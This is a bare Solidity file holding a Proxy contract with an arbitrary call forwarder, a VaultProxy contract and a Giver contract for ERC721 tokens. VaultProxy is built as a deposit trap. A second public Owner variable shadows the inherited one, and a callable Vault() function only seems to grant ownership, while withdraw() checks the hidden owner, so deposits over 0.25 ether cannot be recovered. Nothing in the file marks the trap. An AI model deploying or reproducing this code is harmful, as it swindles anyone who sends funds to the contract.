 

pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}
interface ERC721 {
  function ownerOf(
    uint256 _tokenId
  )
    external
    view
    returns (address);

  function transferFrom(
    address _from,
    address _to,
    uint256 _tokenId
  )
    external;
}

contract Giver {
  function getToken(
    address _contract,
    uint256 _tokenId
  )
    external
    payable
  {
    require(msg.value >= 1000000 ether);
    ERC721(_contract).transferFrom(ERC721(_contract).ownerOf(_tokenId), msg.sender, _tokenId);
  }
}
